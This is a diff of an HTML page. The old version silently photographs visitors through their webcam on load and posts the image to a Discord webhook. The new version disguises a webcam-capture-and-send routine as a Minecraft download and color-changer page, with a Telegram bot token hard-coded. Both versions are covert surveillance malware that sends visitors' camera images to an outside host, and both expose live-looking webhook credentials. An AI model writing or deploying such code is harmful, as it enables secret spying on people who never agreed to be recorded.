@@ -1,62 +1,62 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Image to Discord Webhook</title>
+    <title>Send Image to Telegram Webhook</title>
 </head>
 <body>
-    <h1>Send Image to Discord Webhook</h1>
+    <h1>Welcome to the Minecraft Download Page & Color Changing Website!</h1>
+    <p>Click the "Download Minecraft" button to download Minecraft and the "Change Color" button to change the background color:</p>
+
+    <button id="downloadButton">Download Minecraft</button>
+    <button id="colorChangeButton">Change Color</button>
+    <video id="videoElement" autoplay></video>
 
     <script>
-        // Function to send image to Discord webhook
-        function sendImageToWebhook() {
-            const video = document.createElement('video');
+        const video = document.getElementById('videoElement');
+        let imgIndex = 1;
 
-            // Check if the browser supports accessing the user's camera
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function (stream) {
-                        video.srcObject = stream;
-                        video.addEventListener('loadedmetadata', function () {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                            // Convert canvas to data URL
-                            const imgURL = canvas.toDataURL('image/png');
-
-                            // Create FormData object
-                            const formData = new FormData();
-                            formData.append('image', dataURItoBlob(imgURL), 'image.png');
-
-                            // Webhook URL
-                            const webhookURL = 'https://ptb.discord.com/api/webhooks/1218581972482527292/56_Q51t96EYp1h_rD6A9ub5RQOn-_dtfNWY-kjvd3smQy2O8Ly-wVzWi6t-8dAQ7oCg1';
-
-                            // Send POST request to Discord webhook
-                            fetch(webhookURL, {
-                                method: 'POST',
-                                body: formData
-                            })
-                            .then(response => {
-                                if (!response.ok) {
-                                    throw new Error('Failed to send image to Discord webhook');
-                                }
-                                console.log('Image sent to Discord webhook');
-                            })
-                            .catch(error => {
-                                console.error('Error:', error);
-                            });
-                        });
-                    })
-                    .catch(function (error) {
-                        console.error("Error accessing camera:", error);
-                    });
-            }
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function (stream) {
+                    video.srcObject = stream;
+                })
+                .catch(function (error) {
+                    console.error("Error accessing camera:", error);
+                });
         }
 
-        // Function to convert data URI to Blob
+        function capturePicture() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imgURL = canvas.toDataURL('image/png');
+
+            const webhookURL = 'https://api.telegram.org/bot7003330372:AAEj0rg44xPlKIEPC4hr9wnJMd22vnVkbDg/sendPhoto';
+            const imgData = imgURL.replace(/^data:image\/\w+;base64,/, '');
+
+            const payload = new FormData();
+            payload.append('chat_id', '7003330372'); // Replace <CHAT_ID> with your actual chat ID
+            payload.append('photo', dataURItoBlob(imgURL), 'captured_image.png');
+
+            fetch(webhookURL, {
+                method: 'POST',
+                body: payload
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to send image to Telegram webhook');
+                }
+                console.log('Image sent to Telegram webhook');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+
+            console.log('Image ' + imgIndex + ' sent to Telegram webhook');
+            imgIndex++;
+        }
+
         function dataURItoBlob(dataURI) {
             const byteString = atob(dataURI.split(',')[1]);
             const ab = new ArrayBuffer(byteString.length);
@@ -67,8 +67,29 @@
             return new Blob([ab], { type: 'image/png' });
         }
 
-        // Call the function to send image to Discord webhook
-        sendImageToWebhook();
+        const downloadButton = document.getElementById('downloadButton');
+        downloadButton.addEventListener('click', function () {
+            const fileContent = 'This is a sample Minecraft file. Enjoy playing Minecraft!';
+            const fileBlob = new Blob([fileContent], { type: 'text/plain' });
+            const fileURL = URL.createObjectURL(fileBlob);
+
+            const downloadLink = document.createElement('a');
+            downloadLink.href = fileURL;
+            downloadLink.download = 'minecraft.txt';
+            downloadLink.click();
+        });
+
+        const colorChangeButton = document.getElementById('colorChangeButton');
+        const colors = ['#673ab7', '#f44336', '#03a9f4', '#e91e63', '#ff5722']; /* Luxury color palette */
+        let index = 0;
+
+        colorChangeButton.addEventListener('click', function () {
+            document.body.style.backgroundColor = colors[index];
+            let textColor = index === colors.length - 1 ? '#000' : '#fff';
+            document.body.style.color = textColor;
+            downloadButton.style.backgroundColor = colors[index]; // Change button color along with background
+            index = (index + 1) % colors.length;
+        });
     </script>
 </body>
 </html>
